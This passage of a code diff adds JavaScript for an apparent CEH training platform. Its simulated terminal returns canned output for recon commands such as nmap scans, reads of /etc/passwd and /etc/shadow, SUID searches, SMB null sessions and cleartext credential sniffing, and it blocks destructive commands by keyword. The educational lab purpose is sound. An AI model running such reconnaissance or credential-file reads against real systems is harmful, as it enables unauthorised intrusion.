+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'Linux cadet-node 5.15.0-89-generic #99-Ubuntu SMP Mon Oct 16 14:10:00 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux',
+          explanation: 'Fingerprints the operating system release, machine architecture, and kernel patch level.'
+        });
+      } else if (lower === 'whoami') {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'cadet',
+          explanation: 'Reports current effective user login in the training container (unprivileged cadet).'
+        });
+      } else if (lower.startsWith('id')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'uid=1001(cadet) gid=1001(cadet) groups=1001(cadet),27(sudo)',
+          explanation: 'Inspects user ID, primary group ID, and supplementary groups (cadet has sudo group membership).'
+        });
+      } else if (lower.includes('/etc/passwd')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nftp:x:115:124:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin\nmysql:x:116:125:MySQL Server,,,:/nonexistent:/bin/false\ncadet:x:1001:1001:CEH Cadet Workstation,,,:/home/cadet:/bin/bash',
+          explanation: 'Standard world-readable account registry. Passwords represented as "x" pointing to /etc/shadow.'
+        });
+      } else if (lower.includes('/etc/shadow')) {
+        CEHState.terminalLines.push({
+          type: 'error',
+          text: 'cat: /etc/shadow: Permission denied',
+          hint: '/etc/shadow permissions are 640 (root:shadow). Requires root privilege escalation (see Lab 06 System Hacking).'
+        });
+      } else if (lower.includes('ip') && (lower.includes('addr') || lower.includes('route'))) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'lo               UNKNOWN        127.0.0.1/8 ::1/128 \neth0             UP             10.10.20.10/24 fe80::20c:29ff:fe4a:8b9c/64 \ndefault via 10.10.20.1 dev eth0 proto static onlink \n10.10.20.0/24 dev eth0 proto kernel scope link src 10.10.20.10',
+          explanation: 'Audits network adapters, assigned IPv4 CIDR blocks, and active kernel routing tables.'
+        });
+      } else if (lower.startsWith('dig')) {
+        if (lower.includes('axfr')) {
+          CEHState.terminalLines.push({
+            type: 'accent',
+            text: ';; Connection to 10.10.20.2#53: Transfer failed: REFUSED\n;; AXFR record query denied by ACL trusted-secondaries',
+            explanation: 'Zone Transfer (AXFR) over TCP port 53. Server denied replication due to proper zone transfer ACLs.'
+          });
+        } else if (lower.includes('ns') || lower.includes('mx')) {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'corp-target.local.    3600    IN    NS    ns1.corp-target.local.\ncorp-target.local.    3600    IN    MX    10 mail.corp-target.local.',
+            explanation: 'Resolves authoritative Name Server (NS) and Mail Exchanger (MX) records for the domain.'
+          });
+        } else {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'corp-target.local.    3600    IN    A     10.10.20.50',
+            explanation: 'Standard DNS A record lookup resolving hostname to target server IP 10.10.20.50.'
+          });
+        }
+      } else if (lower.startsWith('nmap')) {
+        if (lower.includes('-sn')) {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'Nmap scan report for 10.10.20.1 (Gateway)\nHost is up (0.00045s latency).\nNmap scan report for 10.10.20.10 (Cadet Node)\nHost is up (0.00010s latency).\nNmap scan report for 10.10.20.50 (Target Server)\nHost is up (0.00082s latency).\nNmap done: 256 IP addresses (3 hosts up) scanned in 1.42 seconds',
+            explanation: 'Ping sweep discovery across CIDR subnet 10.10.20.0/24 identifying online targets without port scanning.'
+          });
+        } else {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'PORT     STATE SERVICE VERSION\n21/tcp   open  ftp     vsftpd 2.3.4\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4\n80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))\n443/tcp  open  ssl/http Apache httpd 2.4.52\n3306/tcp open  mysql   MySQL 8.0.35\n445/tcp  open  netbios-ssn Samba 4.15.13',
+            explanation: 'SYN stealth port scan (-sS) with service banner fingerprinting (-sV) identifying listening server versions.'
+          });
+        }
+      } else if (lower.startsWith('ss') || lower.startsWith('netstat')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\ntcp   LISTEN 0      128    0.0.0.0:22          0.0.0.0:*     users:(("sshd",pid=842,fd=3))\ntcp   LISTEN 0      511    0.0.0.0:80          0.0.0.0:*     users:(("apache2",pid=1024,fd=4))\ntcp   LISTEN 0      128    127.0.0.1:3306      0.0.0.0:*     users:(("mysqld",pid=920,fd=21))\ntcp   LISTEN 0      128    0.0.0.0:445         0.0.0.0:*     users:(("smbd",pid=1102,fd=35))',
+          explanation: 'Audits open listening sockets, port bindings, and associated process IDs (PIDs).'
+        });
+      } else if (lower.startsWith('smbclient')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'Sharename       Type      Comment\n---------       ----      -------\nprint$          Disk      Printer Drivers\npublic          Disk      Cadet Shared Training Workspace\nIPC$            IPC       IPC Service (Samba Server)\nReconnecting with SMB1 for workgroup listing.\nServer               Comment\n---------            -------\nCORP-TARGET          Samba 4.15.13',
+          explanation: 'Lists SMB shares using an unauthenticated null session over port 445.'
+        });
+      } else if (lower.startsWith('find') && lower.includes('-4000')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: '/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/local/bin/custom_backup (ANOMALOUS NON-STANDARD SUID BINARY)',
+          explanation: 'Searches filesystem for files with SUID bit (4000) set, revealing potential local privilege escalation targets.'
+        });
+      } else if (lower.startsWith('sha256sum')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: '275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f  eicar.com',
+          explanation: 'Computes cryptographic SHA-256 hash. Demonstrates integrity verification of the benign EICAR test string.'
+        });
+      } else if (lower.startsWith('file')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'sample_artifact: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, stripped',
+          explanation: 'Inspects magic bytes at file header to determine real format regardless of extension.'
+        });
+      } else if (lower.startsWith('tcpdump')) {
+        CEHState.terminalLines.push({
+          type: 'accent',
+          text: '10.10.20.10.49210 > 10.10.20.50.80: Flags [S], seq 184920120, win 64240, length 0\n10.10.20.50.80 > 10.10.20.10.49210: Flags [S.], seq 389102450, ack 184920121, win 65160, length 0\n10.10.20.10.49210 > 10.10.20.50.80: Flags [.], ack 1, win 502, length 0\n[+] Intercepted HTTP POST payload: username=admin&password=Password123!',
+          explanation: 'Dissects TCP 3-way handshake and intercepts cleartext HTTP credential payload.'
+        });
+      } else if (lower.startsWith('iptables')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'Chain INPUT (policy DROP 142 packets)\nnum  pkts bytes target     prot opt in     out     source       destination\n1    1042 84920 ACCEPT     all  --  lo     *       0.0.0.0/0    0.0.0.0/0\n2    2490  182K ACCEPT     all  --  *      *       0.0.0.0/0    0.0.0.0/0   ctstate RELATED,ESTABLISHED\n3     180 10800 ACCEPT     tcp  --  eth0   *       10.10.20.0/24 0.0.0.0/0   tcp dpt:22',
+          explanation: 'Inspects Linux kernel netfilter packet filtering rules for active drop/accept policies.'
+        });
+      } else if (lower.startsWith('curl')) {
+        if (lower.includes('-i') || lower.includes('-head')) {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'HTTP/1.1 200 OK\nDate: Sat, 17 Oct 2026 12:00:00 GMT\nServer: Apache/2.4.52 (Ubuntu)\nSet-Cookie: PHPSESSID=s7d9f2a0b4c8e1; path=/; HttpOnly; SameSite=Strict\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nContent-Type: text/html; charset=UTF-8',
+            explanation: 'Audits HTTP response headers. Note presence of HttpOnly and SameSite cookie defense flags.'
+          });
+        } else {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: '<!DOCTYPE html>\n<html>\n<head><title>Authorized Enclave Portal</title></head>\n<body>\n<h1>10.10.20.50 Internal Training Application</h1>\n<p>Status: All services operational under Rules of Engagement.</p>\n</body>\n</html>',
+            explanation: 'Retrieves rendered HTML body from the target web server.'
+          });
+        }
+      } else if (lower.startsWith('powershell') || lower.includes('get-adobject')) {
+        CEHState.terminalLines.push({
+          type: 'accent',
+          text: 'name                 msPKI-Certificate-Name-Flag\n----                 ---------------------------\nWebServer-Custom                               1\nUser-Express-Enroll                            1\n[!] CRITICAL AD CS ESC1: CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is enabled on Client Auth templates!',
+          explanation: 'Queries Active Directory configuration partition detecting ESC1 enrollee-supplies-subject template misconfiguration.'
+        });
+      } else if (lower.startsWith('openssl')) {
+        if (lower.includes('enc') || lower.includes('aes')) {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: '[+] OpenSSL AES-256-CBC cipher processed successfully.\n[+] Key derivation: PBKDF2 with SHA-256 iteration count: 100,000\n[+] Output: secret_payload_decrypted.txt (Hash: 8f4b23... verified)',
+            explanation: 'Demonstrates symmetric AES-256 encryption with password-based key derivation (PBKDF2).'
+          });
+        } else {
+          CEHState.terminalLines.push({
+            type: 'success',
+            text: 'Certificate:\n    Data:\n        Version: 3 (0x2)\n        Serial Number: 4a:2b:8c:19:90\n        Signature Algorithm: sha256WithRSAEncryption\n        Issuer: CN=Corp-Internal-Root-CA, DC=corp, DC=enclave\n        Validity\n            Not Before: Oct 17 00:00:00 2026 GMT\n            Not After : Oct 17 00:00:00 2027 GMT\n        Subject: CN=webserver.corp.enclave',
+            explanation: 'Parses and displays X.509 certificate fields (Subject, Issuer, Validity, RSA Key Size).'
+          });
+        }
+      } else if (lower.startsWith('aws')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: '{\n    "UserId": "AIDASAMPLEENCLAVEUSER",\n    "Account": "123456789012",\n    "Arn": "arn:aws:iam::123456789012:user/ceh-cadet-auditor"\n}',
+          explanation: 'Executes "aws sts get-caller-identity" to verify AWS IAM credentials and caller ARN.'
+        });
+      } else if (lower.startsWith('adb')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'List of devices attached\nemulator-5554          device\npackage:com.vulnerable.mobiletraining (debuggable=true, allowBackup=true)',
+          explanation: 'Audits Android Debug Bridge device and identifies insecure debuggable flag in AndroidManifest.xml.'
+        });
+      } else if (lower.startsWith('iwconfig') || lower.startsWith('airmon')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'wlan0mon   IEEE 802.11  Mode:Monitor  Frequency:2.412 GHz  Tx-Power=20 dBm\n           Retry short limit:7   RTS thr:off   Fragment thr:off\n           Power Management:off',
+          explanation: 'Reports wireless interface in 802.11 RF monitor mode for passive beacon dissection.'
+        });
+      } else if (lower.startsWith('ping')) {
+        CEHState.terminalLines.push({
+          type: 'success',
+          text: 'PING 10.10.20.1 (10.10.20.1) 56(84) bytes of data.\n64 bytes from 10.10.20.1: icmp_seq=1 ttl=64 time=0.412 ms\n64 bytes from 10.10.20.1: icmp_seq=2 ttl=64 time=0.389 ms\n\n--- 10.10.20.1 ping statistics ---\n2 packets transmitted, 2 received, 0% packet loss, time 1001ms',
+          explanation: 'Verifies network reachability to the local enclave gateway.'
+        });
+      } else {
+        // Typo & safety checks
+        let hintMsg = 'Type "help" to view all 40+ supported CEH practical commands.';
+        const token = cmd.split(' ')[0].toLowerCase();
+        
+        if (token === 'namp') hintMsg = 'Did you mean "nmap"? Example: nmap -sS -p 21,80 10.10.20.10';
+        else if (token === 'tcpdupm') hintMsg = 'Did you mean "tcpdump"? Example: tcpdump -i eth0';
+        else if (token === 'ifconfg' || token === 'ipconfig') hintMsg = 'Did you mean "ip -br addr show" or "ifconfig"?';
+        else if (token === 'whois' || token === 'whoi') hintMsg = 'Try: dig @10.10.20.2 corp-target.local A';
+        else if (token.includes('rm') || token.includes('drop') || token.includes('delete')) hintMsg = 'Destructive commands are safely restricted. All exercises operate within authorized enclave 10.10.20.0/24.';
+        else if (token === 'ls' || token === 'dir') hintMsg = 'Try: smbclient -L //10.10.20.50 or find / -perm -4000 to enumerate files.';
+        else if (token.includes('scan') || token.includes('recon')) hintMsg = 'For network scanning, use "nmap -sn 10.10.20.0/24" or "nmap -sS -sV -p- 10.10.20.50".';
+
+        CEHState.terminalLines.push({
+          type: 'error',
+          text: `bash: ${escapeHtml(token)}: command not found or restricted in safe sandbox.`,
+          hint: hintMsg
+        });
+      }
+    }
+
+      updateTerminalViews();
+    }
+
+    function formatTerminalLine(line) {
+      if (line.type === 'input') {
+        return `<div class="text-white"><span class="text-cyber-emerald font-bold">cadet@ceh-node:~$</span> ${escapeHtml(line.text)}</div>`;
+      } else if (line.type === 'success') {
+        return `
+          <div class="space-y-1">
+            <div class="text-[9px] font-mono text-emerald-500/80 font-bold tracking-wider uppercase flex items-center gap-1">
+              <span>●</span> <span>[SIMULATED ENCLAVE OUTPUT]</span>
+            </div>
+            <pre class="text-emerald-400 whitespace-pre-wrap leading-relaxed select-all">${escapeHtml(line.text)}</pre>
+            ${line.explanation ? `<div class="text-[11px] font-mono text-slate-400 italic bg-charcoal-900/60 p-2 rounded border border-charcoal-800">ℹ️ ${escapeHtml(line.explanation)}</div>` : ''}
+          </div>
+        `;
+      } else if (line.type === 'accent') {
+        return `
+          <div class="space-y-1">
+            <div class="text-[9px] font-mono text-cyan-500/80 font-bold tracking-wider uppercase flex items-center gap-1">
+              <span>●</span> <span>[SIMULATED ENCLAVE OUTPUT]</span>
+            </div>
+            <pre class="text-cyber-cyan whitespace-pre-wrap select-all">${escapeHtml(line.text)}</pre>
+            ${line.explanation ? `<div class="text-[11px] font-mono text-slate-400 italic bg-charcoal-900/60 p-2 rounded border border-charcoal-800">ℹ️ ${escapeHtml(line.explanation)}</div>` : ''}
+          </div>
+        `;
+      } else if (line.type === 'error') {
+        return `
+          <div class="space-y-1">
+            <div class="text-[9px] font-mono text-rose-500/80 font-bold tracking-wider uppercase flex items-center gap-1">
+              <span>✕</span> <span>[SIMULATED ENCLAVE ERROR]</span>
+            </div>
+            <div class="text-rose-400 whitespace-pre-wrap">${escapeHtml(line.text)}</div>
+            ${line.hint ? `<div class="text-[11px] font-mono text-amber-300 bg-amber-950/20 p-2 rounded border border-amber-500/30">💡 <strong>Safe Hint:</strong> ${escapeHtml(line.hint)}</div>` : ''}
+          </div>
+        `;
+      } else if (line.type === 'info') {
+        return `<div class="text-slate-300 whitespace-pre-wrap">${escapeHtml(line.text)}</div>`;
+      } else {
+        return `<div class="text-slate-400 whitespace-pre-wrap">${escapeHtml(line.text)}</div>`;
+      }
+    }
+
+    function updateTerminalViews() {
+      const drawerBody = document.getElementById('drawer-terminal-body');
+      if (drawerBody) {
+        drawerBody.innerHTML = CEHState.terminalLines.map(l => formatTerminalLine(l)).join('');
+        drawerBody.scrollTop = drawerBody.scrollHeight;
+      }
+      const fullBody = document.getElementById('full-terminal-output');
+      if (fullBody) {
+        fullBody.innerHTML = CEHState.terminalLines.map(l => formatTerminalLine(l)).join('');
+        fullBody.scrollTop = fullBody.scrollHeight;
+      }
+    }
+
+    function toggleTerminalDrawer(open) {
+      const drawer = document.getElementById('terminal-drawer');
+      if (!drawer) return;
+      if (open) {
+        drawer.classList.remove('translate-y-full');
+        setTimeout(() => {
+          const inp = document.getElementById('drawer-terminal-input');
+          if (inp) inp.focus();
+        }, 100);
+      } else {
+        drawer.classList.add('translate-y-full');
+      }
+    }
+
+    function autoTypeCommand(cmd) {
+      AudioEngine.click();
+      toggleTerminalDrawer(true);
+      const inp = document.getElementById('drawer-terminal-input');
+      if (inp) {
+        inp.value = cmd;
+        inp.focus();
+      }
+      showToast('Command loaded into terminal prompt! Press Enter to execute.', 'info');
+    }
+
+    function handleTerminalKey(e) {
+      const inp = document.getElementById('drawer-terminal-input');
+      if (!inp) return;
+
+      if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (CEHState.terminalHistory.length > 0 && CEHState.terminalHistoryIdx > 0) {
+          CEHState.terminalHistoryIdx--;
+          inp.value = CEHState.terminalHistory[CEHState.terminalHistoryIdx];
+        }
+      } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (CEHState.terminalHistoryIdx < CEHState.terminalHistory.length - 1) {
+          CEHState.terminalHistoryIdx++;
+          inp.value = CEHState.terminalHistory[CEHState.terminalHistoryIdx];
+        } else {
+          CEHState.terminalHistoryIdx = CEHState.terminalHistory.length;
+          inp.value = '';
+        }
+      } else if (e.key === 'Enter') {
+        submitTerminalCommand();
+      }
+    }
+
+    function handleFullTerminalKey(e) {
+      const inp = document.getElementById('full-terminal-input');
+      if (!inp) return;
+
+      if (e.key === 'ArrowUp') {
+        e.preventDefault();
+        if (CEHState.terminalHistory.length > 0 && CEHState.terminalHistoryIdx > 0) {
+          CEHState.terminalHistoryIdx--;
+          inp.value = CEHState.terminalHistory[CEHState.terminalHistoryIdx];
+        }
+      } else if (e.key === 'ArrowDown') {
+        e.preventDefault();
+        if (CEHState.terminalHistoryIdx < CEHState.terminalHistory.length - 1) {
+          CEHState.terminalHistoryIdx++;
+          inp.value = CEHState.terminalHistory[CEHState.terminalHistoryIdx];
+        } else {
+          CEHState.terminalHistoryIdx = CEHState.terminalHistory.length;
+          inp.value = '';
+        }
+      } else if (e.key === 'Enter') {
+        submitFullTerminalCommand();
+      }
+    }
+
+    function submitTerminalCommand() {
+      const inp = document.getElementById('drawer-terminal-input');
+      if (!inp || !inp.value.trim()) return;
+      const cmd = inp.value;
+      inp.value = '';
+      executeSimulatedCommand(cmd);
+    }
+
+    function submitFullTerminalCommand() {
+      const inp = document.getElementById('full-terminal-input');
+      if (!inp || !inp.value.trim()) return;
+      const cmd = inp.value;
+      inp.value = '';
+      executeSimulatedCommand(cmd);
+    }
+
+    function clearTerminal() {
+      CEHState.terminalLines = [];
+      updateTerminalViews();
+    }
+
+    // --- Lab Step & Checklist Toggles ---
+    function toggleStepComplete(labId, stepNo, forceTrue = false) {
+      if (!CEHState.progress[labId]) {
+        CEHState.progress[labId] = { completedSteps: [], completedChecklist: [], isCompleted: false };
+      }
+      const prog = CEHState.progress[labId];
+      if (forceTrue) {
+        if (!prog.completedSteps.includes(stepNo)) {
+          prog.completedSteps.push(stepNo);
+          AudioEngine.success();
+        }
+      } else {
+        if (prog.completedSteps.includes(stepNo)) {
+          prog.completedSteps = prog.completedSteps.filter(s => s !== stepNo);
+        } else {
+          prog.completedSteps.push(stepNo);
+          AudioEngine.success();
+        }
+      }
+      checkLabAutoCompletion(labId);
+      saveState();
+      renderCurrentView();
+    }
+
+    function toggleChecklistItem(labId, idx) {
+      if (!CEHState.progress[labId]) {
+        CEHState.progress[labId] = { completedSteps: [], completedChecklist: [], isCompleted: false };
+      }
+      const prog = CEHState.progress[labId];
+      if (prog.completedChecklist.includes(idx)) {
+        prog.completedChecklist = prog.completedChecklist.filter(i => i !== idx);
+      } else {
+        prog.completedChecklist.push(idx);
+        AudioEngine.click();
+      }
+      checkLabAutoCompletion(labId);
+      saveState();
+      renderCurrentView();
+    }
+
+    function checkLabAutoCompletion(labId) {
+      const lab = CEHState.labs.find(l => l.id === labId);
+      const prog = CEHState.progress[labId];
+      if (!lab || !prog) return;
+
+      if (prog.completedSteps.length === lab.steps.length && prog.completedChecklist.length === lab.checklist.length) {
+        if (!prog.isCompleted) {
+          prog.isCompleted = true;
+          AudioEngine.success();
+          showToast(`Lab "${lab.title}" completed! Readiness score updated.`, 'success');
+        }
+      }
+    }
+
+    function toggleLabComplete(labId) {
+      if (!CEHState.progress[labId]) {
+        CEHState.progress[labId] = { completedSteps: [], completedChecklist: [], isCompleted: false };
+      }
+      const prog = CEHState.progress[labId];
+      prog.isCompleted = !prog.isCompleted;
+      if (prog.isCompleted) {
+        AudioEngine.success();
+        showToast('Lab marked as completed! (+100 Readiness Points)', 'success');
+      } else {
+        AudioEngine.click();
+        showToast('Lab marked as in progress.', 'info');
+      }
+      saveState();
+      renderCurrentView();
+    }
+
+    function resetLabProgress(labId) {
+      if (!confirm('Reset all progress, steps, and checklist for this lab?')) return;
+      delete CEHState.progress[labId];
+      delete CEHState.notes[labId];
+      saveState();
+      showToast('Lab progress reset.', 'info');
+      renderCurrentView();
+    }
+
+    function resetPlatformProgress() {
+      if (!confirm('Are you sure you want to reset ALL 21 lab progress records and quiz scores?')) return;
+      CEHState.progress = {};
+      CEHState.notes = {};
+      CEHState.bookmarks = [];
+      CEHState.quizScores = {};
+      saveState();
+      showToast('All CEH v13 progress records have been reset.', 'info');
+      renderSidebar();
+      renderCurrentView();
+    }
+
+    // --- Notes Auto-Save ---
+    let notesTimeout = null;
+    function handleNotesInput(labId, e) {
+      const val = e.target.value;
+      CEHState.notes[labId] = val;
+      const ind = document.getElementById('notes-save-indicator');
+      if (ind) ind.textContent = 'Saving...';
+
+      clearTimeout(notesTimeout);
+      notesTimeout = setTimeout(() => {
+        saveState();
+        if (ind) ind.textContent = 'Saved';
+      }, 600);
+    }
+
+    function saveNotesExplicitly(labId) {
+      saveState();
+      AudioEngine.click();
+      showToast('Personal notes saved!', 'success');
+    }
+
+    // --- Bookmarking ---
+    function toggleBookmark(labId, e) {
+      if (e) e.stopPropagation();
+      AudioEngine.click();
+      if (CEHState.bookmarks.includes(labId)) {
+        CEHState.bookmarks = CEHState.bookmarks.filter(id => id !== labId);
+        showToast('Bookmark removed.', 'info');
+      } else {
+        CEHState.bookmarks.push(labId);
+        showToast('Added to bookmarks!', 'success');
+      }
+      saveState();
+      renderCurrentView();
+    }
+
+    // --- Sidebar Population & Search ---
+    function renderSidebar() {
+      const list = document.getElementById('sidebar-module-list');
+      if (!list) return;
+
+      const q = (CEHState.sidebarSearch || '').toLowerCase().trim();
+      const filtered = CEHState.modules.filter(m => {
+        const lab = CEHState.labs.find(l => l.id === m.labId) || {};
+        const stepsMatch = (lab.steps || []).some(s => (s.command || '').toLowerCase().includes(q) || (s.title || '').toLowerCase().includes(q));
+        return !q || m.title.toLowerCase().includes(q) || m.number.toLowerCase().includes(q) || (m.description || '').toLowerCase().includes(q) || stepsMatch;
+      });
+
+      list.innerHTML = filtered.map(m => {
+        const isDone = (CEHState.progress[m.labId] || {}).isCompleted;
+        const isActive = CEHState.activeView === 'lab' && CEHState.activeLabId === m.labId;
+
+        return `
+          <div onclick="navigate('lab', '${m.labId}')" class="flex items-center justify-between p-2 rounded-lg text-xs font-mono cursor-pointer transition ${isActive ? 'bg-cyber-cyan/15 border-l-2 border-cyber-cyan text-white font-bold' : 'text-slate-400 hover:text-white hover:bg-charcoal-850'}">
+            <div class="flex items-center gap-2 truncate">
+              <span class="text-[10px] ${m.number === 'AD' ? 'text-purple-400 font-bold' : 'text-slate-500'}">M${m.number}</span>
+              <span class="truncate">${escapeHtml(m.shortTitle || m.title)}</span>
+            </div>
+            ${isDone ? '<span class="text-cyber-emerald text-[11px] font-bold">✔</span>' : ''}
+          </div>
+        `;
+      }).join('');
+
+      const countEl = document.getElementById('sidebar-completed-count');
+      if (countEl) {
+        const completedCount = Object.values(CEHState.progress).filter(p => p.isCompleted).length;
+        countEl.textContent = `${completedCount}/${CEHState.labs.length}`;
+      }
+    }
+
+    function handleSidebarSearch(e) {
+      CEHState.sidebarSearch = e.target.value;
+      renderSidebar();
+    }
+
+    function handleCatalogSearch(e) {
+      CEHState.searchQuery = e.target.value;
+      renderCurrentView();
+    }
+
+    function handleCategoryFilter(cat) {
+      CEHState.activeModuleFilter = cat;
+      renderCurrentView();
+    }
+
+    function handleDifficultyFilter(e) {
+      CEHState.activeDifficultyFilter = e.target.value;
+      renderCurrentView();
+    }
+
+    function resetFilters() {
+      CEHState.searchQuery = '';
+      CEHState.activeModuleFilter = 'All';
+      CEHState.activeDifficultyFilter = 'All';
+      renderCurrentView();
+    }
+
+    function toggleSidebar() {
+      const sb = document.getElementById('platform-sidebar');
+      if (sb) sb.classList.toggle('hidden');
+    }
+
+    // --- Interactive Knowledge-Check Quiz Modal ---
+    function openQuizModal(moduleId) {
+      const quiz = CEHState.quizzes.find(q => q.moduleId === moduleId);
+      if (!quiz) return;
+
+      AudioEngine.click();
+      let activeIndex = 0;
+      let userAnswers = {}; // qId -> selectedIndex
+      let questionsList = JSON.parse(JSON.stringify(quiz.questions));
+
+      window.shuffleQuizQuestions = () => {
+        for (let i = questionsList.length - 1; i > 0; i--) {
+          const j = Math.floor(Math.random() * (i + 1));
+          [questionsList[i], questionsList[j]] = [questionsList[j], questionsList[i]];
+        }
+        activeIndex = 0;
+        userAnswers = {};
+        AudioEngine.click();
+        showToast('Questions randomized for practice drill!', 'info');
+        renderQuizStep();
+      };
+
+      const modal = document.createElement('div');
+      modal.id = 'quiz-modal';
+      modal.className = 'fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-center justify-center p-4';
+
+      function renderQuizStep() {
+        const q = questionsList[activeIndex];
+        const isAnswered = userAnswers[q.id] !== undefined;
+
+        modal.innerHTML = `
+          <div class="bg-charcoal-900 border border-charcoal-700 rounded-2xl max-w-2xl w-full p-6 sm:p-8 space-y-6 shadow-2xl relative font-mono text-xs">
+            <div class="flex items-center justify-between border-b border-charcoal-800 pb-3">
+              <div>
+                <span class="text-cyber-amber font-bold uppercase tracking-wider text-[11px]">CEH v13 Knowledge Check</span>
+                <h3 class="text-white font-bold text-base mt-0.5">Module ${moduleId} Readiness Assessment</h3>
+              </div>
+              <div class="flex items-center gap-2">
+                <button onclick="shuffleQuizQuestions()" title="Randomize questions order" class="px-2 py-1 rounded bg-charcoal-800 hover:bg-charcoal-700 text-slate-300 border border-charcoal-700 text-[10px]">🔀 Randomize</button>
+                <button onclick="closeQuizModal()" class="text-slate-400 hover:text-white text-lg font-bold">✕</button>
+              </div>
+            </div>
+
+            <div class="flex items-center justify-between text-slate-400 text-[11px]">
+              <span>Question ${activeIndex + 1} of ${questionsList.length}</span>
+              <div class="flex gap-1">
+                ${questionsList.map((_, i) => `
+                  <span class="w-2.5 h-2.5 rounded-full ${i === activeIndex ? 'bg-cyber-cyan' : userAnswers[questionsList[i].id] !== undefined ? 'bg-cyber-emerald' : 'bg-charcoal-800'}"></span>
+                `).join('')}
+              </div>
+            </div>
+
+            <div class="text-slate-100 font-semibold text-sm leading-relaxed">
+              ${escapeHtml(q.question)}
+            </div>
+
+            <!-- Options -->
+            <div class="space-y-2">
+              ${q.options.map((opt, oIdx) => {
+                let btnStyle = 'bg-charcoal-850 hover:bg-charcoal-800 border-charcoal-700 text-slate-200';
+                if (isAnswered) {
+                  if (oIdx === q.correctIndex) {
+                    btnStyle = 'bg-emerald-950/60 border-cyber-emerald text-emerald-300 font-bold';
+                  } else if (userAnswers[q.id] === oIdx) {
+                    btnStyle = 'bg-rose-950/60 border-rose-500 text-rose-300';
+                  } else {
+                    btnStyle = 'bg-charcoal-900 border-charcoal-800 text-slate-500 opacity-60';
+                  }
+                }
+
+                return `
+                  <button onclick="selectQuizAnswer('${q.id}', ${oIdx}, ${q.correctIndex})" ${isAnswered ? 'disabled' : ''} class="w-full text-left p-3.5 rounded-xl border text-xs font-mono transition flex items-center justify-between gap-3 ${btnStyle}">
+                    <span>${escapeHtml(opt)}</span>
+                    ${isAnswered && oIdx === q.correctIndex ? '<span class="text-cyber-emerald font-bold">✔</span>' : ''}
+                    ${isAnswered && userAnswers[q.id] === oIdx && oIdx !== q.correctIndex ? '<span class="text-rose-400 font-bold">✕</span>' : ''}
+                  </button>
+                `;
+              }).join('')}
+            </div>
+
+            <!-- Explanation Callout (Revealed after selection) -->
+            ${isAnswered ? `
+              <div class="p-3.5 rounded-xl ${userAnswers[q.id] === q.correctIndex ? 'bg-emerald-950/40 border border-cyber-emerald/40 text-emerald-300' : 'bg-rose-950/40 border border-rose-500/40 text-rose-300'} space-y-1">
+                <div class="font-bold uppercase tracking-wider text-[10px]">
+                  ${userAnswers[q.id] === q.correctIndex ? '✔ Correct Answer!' : '✕ Incorrect'}
+                </div>
+                <div class="text-[11px] leading-relaxed text-slate-300">${escapeHtml(q.explanation)}</div>
+              </div>
+            ` : ''}
+
+            <!-- Bottom Navigation -->
+            <div class="flex items-center justify-between pt-3 border-t border-charcoal-800">
+              <button onclick="prevQuizQuestion()" ${activeIndex === 0 ? 'disabled' : ''} class="px-3 py-1.5 rounded-lg bg-charcoal-800 text-slate-300 hover:text-white disabled:opacity-40">
+                ← Previous
+              </button>
+              
+              ${activeIndex < questionsList.length - 1 ? `
+                <button onclick="nextQuizQuestion()" ${!isAnswered ? 'disabled' : ''} class="px-4 py-1.5 rounded-lg bg-cyber-cyan hover:bg-cyan-400 text-black font-bold disabled:opacity-40">
+                  Next Question →
+                </button>
+              ` : `
+                <button onclick="finishQuiz(${moduleId})" ${!isAnswered ? 'disabled' : ''} class="px-4 py-1.5 rounded-lg bg-cyber-emerald hover:bg-emerald-400 text-black font-bold disabled:opacity-40">
+                  Complete Assessment ✔
+                </button>
+              `}
+            </div>
+          </div>
+        `;
+      }
+
+      window.selectQuizAnswer = (qId, selectedIdx, correctIdx) => {
+        userAnswers[qId] = selectedIdx;
+        if (selectedIdx === correctIdx) {
+          AudioEngine.success();
+        } else {
+          AudioEngine.alert();
+        }
+        renderQuizStep();
+      };
+
+      window.nextQuizQuestion = () => {
+        if (activeIndex < questionsList.length - 1) {
+          activeIndex++;
+          renderQuizStep();
+        }
+      };
+
+      window.prevQuizQuestion = () => {
+        if (activeIndex > 0) {
+          activeIndex--;
+          renderQuizStep();
+        }
+      };
+
+      window.finishQuiz = (modId) => {
+        let correctCount = 0;
